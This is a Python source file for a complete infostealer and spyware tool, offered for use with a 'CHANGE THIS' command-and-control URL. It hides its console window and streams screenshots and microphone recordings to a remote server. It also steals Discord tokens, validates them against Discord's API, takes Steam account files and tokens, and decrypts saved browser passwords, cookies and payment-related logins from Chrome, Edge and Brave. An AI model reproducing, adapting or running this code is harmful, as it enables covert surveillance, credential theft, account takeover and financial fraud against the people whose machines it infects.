import os
import re
import sys
import time
import json
import base64
import socket
import sqlite3
import shutil
import platform
import threading
import requests
from datetime import datetime
from io import BytesIO

# ===== CONFIG =====
C2_URL = "https://c2-receiver.onrender.com"   # <-- CHANGE THIS
# ==================

TARGET_ID = socket.gethostname()
SCREEN_INTERVAL = 8
AUDIO_DURATION = 6
AUDIO_INTERVAL = 40
HARVEST_INTERVAL = 90

def push(data, filename, file_type):
    try:
        files = {"file": (filename, data)}
        form = {"target_id": TARGET_ID, "file_type": file_type}
        requests.post(f"{C2_URL}/upload", files=files, data=form, timeout=50)
    except Exception:
        pass

def push_text(text, filename, file_type):
    push(text.encode("utf-8", errors="ignore"), filename, file_type)

def screen_loop():
    try:
        from PIL import ImageGrab
    except Exception:
        return
    while True:
        try:
            img = ImageGrab.grab()
            buf = BytesIO()
            img.save(buf, format="JPEG", quality=40)
            buf.seek(0)
            push(buf, "live.jpg", "screenshots")
        except Exception:
            pass
        time.sleep(SCREEN_INTERVAL)

def audio_loop():
    try:
        import sounddevice as sd
        import numpy as np
        from scipy.io.wavfile import write as write_wav
    except Exception:
        return
    while True:
        try:
            rec = sd.rec(int(AUDIO_DURATION * 16000), samplerate=16000, channels=1, dtype="float32")
            sd.wait()
            buf = BytesIO()
            write_wav(buf, 16000, rec)
            buf.seek(0)
            ts = datetime.now().strftime("%H%M%S")
            push(buf, f"a_{ts}.wav", "audio")
        except Exception:
            pass
        time.sleep(AUDIO_INTERVAL)

def check_vpn():
    try:
        import subprocess
        out = subprocess.check_output(
            "ipconfig" if platform.system() == "Windows" else "ip addr",
            shell=True, stderr=subprocess.DEVNULL
        ).decode(errors="ignore").lower()
        for k in ["vpn", "tun", "tap", "nordlynx", "wireguard", "openvpn", "proton", "mullvad", "expressvpn", "surfshark"]:
            if k in out:
                return True
    except Exception:
        pass
    return False

def harvest_discord():
    tokens = set()
    paths = []
    if platform.system() == "Windows":
        roaming = os.getenv("APPDATA", "")
        local = os.getenv("LOCALAPPDATA", "")
        paths = [
            os.path.join(roaming, "Discord"),
            os.path.join(roaming, "discordcanary"),
            os.path.join(roaming, "discordptb"),
            os.path.join(local, "Google", "Chrome", "User Data", "Default"),
            os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
            os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        ]
    else:
        home = os.path.expanduser("~")
        paths = [os.path.join(home, ".config", "discord"), os.path.join(home, ".config", "google-chrome", "Default")]
    token_re = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
    for base in paths:
        leveldb = os.path.join(base, "Local Storage", "leveldb")
        if not os.path.isdir(leveldb):
            continue
        for fn in os.listdir(leveldb):
            if not (fn.endswith(".ldb") or fn.endswith(".log")):
                continue
            try:
                with open(os.path.join(leveldb, fn), "r", errors="ignore") as f:
                    for line in f:
                        for m in token_re.findall(line):
                            tokens.add(m)
            except Exception:
                pass
    results = []
    for tok in list(tokens)[:10]:
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": tok}, timeout=6)
            if r.status_code == 200:
                d = r.json()
                results.append({
                    "token": tok,
                    "id": d.get("id"),
                    "username": d.get("username"),
                    "email": d.get("email"),
                    "phone": d.get("phone"),
                    "mfa": d.get("mfa_enabled")
                })
            else:
                results.append({"token": tok, "status": "invalid"})
        except Exception:
            results.append({"token": tok, "status": "error"})
    return results

def harvest_steam():
    """SteamID + AccountName + PersonaName + any stored login tokens / emails from browser"""
    results = []
    bases = []
    if platform.system() == "Windows":
        bases = [
            os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam"),
            os.path.join(os.environ.get("PROGRAMFILES", ""), "Steam"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Steam"),
        ]
    else:
        bases = [os.path.expanduser("~/.steam/steam"), os.path.expanduser("~/.local/share/Steam")]

    for base in bases:
        if not os.path.isdir(base):
            continue
        # loginusers.vdf
        loginusers = os.path.join(base, "config", "loginusers.vdf")
        if os.path.exists(loginusers):
            try:
                with open(loginusers, "r", errors="ignore") as f:
                    content = f.read()
                # blocks per account
                blocks = re.split(r'"(\d{17})"\s*\{', content)
                # blocks[1]=id, blocks[2]=body, blocks[3]=id ...
                for i in range(1, len(blocks), 2):
                    sid = blocks[i]
                    body = blocks[i+1] if i+1 < len(blocks) else ""
                    acc = re.search(r'"AccountName"\s+"([^"]+)"', body)
                    per = re.search(r'"PersonaName"\s+"([^"]+)"', body)
                    ts = re.search(r'"Timestamp"\s+"([^"]+)"', body)
                    results.append({
                        "steam_id": sid,
                        "account_name": acc.group(1) if acc else "?",
                        "persona_name": per.group(1) if per else "?",
                        "last_login": ts.group(1) if ts else "?",
                        "source": "loginusers.vdf"
                    })
            except Exception:
                pass

        # config.vdf / ConnectCache for possible tokens
        for cfg in ["config/config.vdf", "config/loginusers.vdf"]:
            p = os.path.join(base, cfg)
            if os.path.exists(p):
                try:
                    with open(p, "r", errors="ignore") as f:
                        c = f.read()
                    for m in re.findall(r'steamLoginSecure["\s:=]+([^\s"]+)', c, re.I):
                        results.append({"steam_token": m, "source": cfg})
                except Exception:
                    pass

        # ssfn files
        for root, dirs, files in os.walk(base):
            for fn in files:
                if fn.startswith("ssfn"):
                    results.append({"ssfn_file": os.path.join(root, fn), "size": os.path.getsize(os.path.join(root, fn))})

    # also pull steam-related browser logins (email + password)
    browser = harvest_browser()
    for p in browser.get("passwords", []):
        if "steam" in p.get("url", "").lower() or "steampowered" in p.get("url", "").lower():
            results.append({
                "steam_email_or_user": p.get("user"),
                "steam_password": p.get("pass"),
                "url": p.get("url"),
                "source": "browser_password"
            })
    return results

def harvest_browser():
    out = {"passwords": [], "cookies": [], "cards": []}
    if platform.system() != "Windows":
        return out
    try:
        import win32crypt
        from Cryptodome.Cipher import AES
    except Exception:
        return out

    local = os.getenv("LOCALAPPDATA", "")
    browsers = {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
    }

    for bname, base in browsers.items():
        if not os.path.isdir(base):
            continue
        try:
            with open(os.path.join(base, "Local State"), "r", encoding="utf-8") as f:
                key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception:
            continue

        def decrypt(buf):
            try:
                return AES.new(key, AES.MODE_GCM, buf[3:15]).decrypt(buf[15:])[:-16].decode()
            except Exception:
                try:
                    return win32crypt.CryptUnprotectData(buf, None, None, None, 0)[1].decode()
                except Exception:
                    return ""

        # passwords
        db = os.path.join(base, "Default", "Login Data")
        if os.path.exists(db):
            tmp = os.path.join(os.environ.get("TEMP", "."), f"ld_{bname}.db")
            try:
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                for url, user, enc in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if user:
                        pwd = decrypt(enc) if enc else ""
                        entry = {"browser": bname, "url": url, "user": user, "pass": pwd}
                        out["passwords"].append(entry)
                        if re.search(r'(card|payment|billing|checkout|stripe)', url, re.I):
                            out["cards"].append(entry)
                conn.close()
                os.remove(tmp)
            except Exception:
                pass

        # cookies
        cdb = os.path.join(base, "Default", "Network", "Cookies")
        if not os.path.exists(cdb):
            cdb = os.path.join(base, "Default", "Cookies")
        if os.path.exists(cdb):
            tmp = os.path.join(os.environ.get("TEMP", "."), f"ck_{bname}.db")
            try:
                shutil.copy2(cdb, tmp)
                conn = sqlite3.connect(tmp)
                for host, name, enc in conn.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 500"):
                    val = decrypt(enc) if enc else ""
                    if val:
                        out["cookies"].append({"browser": bname, "host": host, "name": name, "value": val[:150]})
                conn.close()
                os.remove(tmp)
            except Exception:
                pass
    return out

def harvest_loop():
    while True:
        try:
            browser = harvest_browser()
            report = {
                "time": str(datetime.now()),
                "host": socket.gethostname(),
                "user": os.getenv("USERNAME") or os.getenv("USER"),
                "platform": platform.platform(),
                "vpn": check_vpn(),
                "discord": harvest_discord(),
                "steam": harvest_steam(),
                "browser": browser
            }
            push_text(json.dumps(report, indent=2), "harvest.json", "accounts")

            lines = []
            lines.append(f"VPN: {report['vpn']}")
            lines.append(f"Host: {report['host']} | User: {report['user']}")
            lines.append("")
            lines.append("========== DISCORD ==========")
            for d in report["discord"]:
                lines.append(f"TOKEN: {d.get('token')}")
                lines.append(f"  ID: {d.get('id')} | USER: {d.get('username')} | EMAIL: {d.get('email')} | PHONE: {d.get('phone')} | MFA: {d.get('mfa')}")
                lines.append("")
            lines.append("========== STEAM ==========")
            for s in report["steam"]:
                if "steam_id" in s:
                    lines.append(f"STEAM_ID: {s.get('steam_id')}")
                    lines.append(f"  ACCOUNT_NAME: {s.get('account_name')}")
                    lines.append(f"  PERSONA: {s.get('persona_name')}")
                    lines.append(f"  LAST_LOGIN: {s.get('last_login')}")
                elif "steam_email_or_user" in s:
                    lines.append(f"STEAM LOGIN (browser)")
                    lines.append(f"  EMAIL/USER: {s.get('steam_email_or_user')}")
                    lines.append(f"  PASSWORD: {s.get('steam_password')}")
                    lines.append(f"  URL: {s.get('url')}")
                elif "steam_token" in s:
                    lines.append(f"STEAM TOKEN: {s.get('steam_token')}")
                elif "ssfn_file" in s:
                    lines.append(f"SSFN: {s.get('ssfn_file')} ({s.get('size')} bytes)")
                lines.append("")
            lines.append("========== PASSWORDS ==========")
            for p in browser.get("passwords", [])[:50]:
                lines.append(f"{p['browser']} | {p['url']}")
                lines.append(f"  USER: {p['user']} | PASS: {p['pass']}")
            lines.append("")
            lines.append("========== CARDS / PAYMENT ==========")
            for c in browser.get("cards", []):
                lines.append(str(c))
            lines.append("")
            lines.append("========== COOKIES (sample) ==========")
            for c in browser.get("cookies", [])[:80]:
                lines.append(f"{c['host']} | {c['name']} = {c['value']}")
            push_text("\n".join(lines), "accounts.txt", "accounts")
        except Exception:
            pass
        time.sleep(HARVEST_INTERVAL)

def hide():
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass

if __name__ == "__main__":
    hide()
    threading.Thread(target=screen_loop, daemon=True).start()
    threading.Thread(target=audio_loop, daemon=True).start()
    threading.Thread(target=harvest_loop, daemon=True).start()
    while True:
        time.sleep(90)
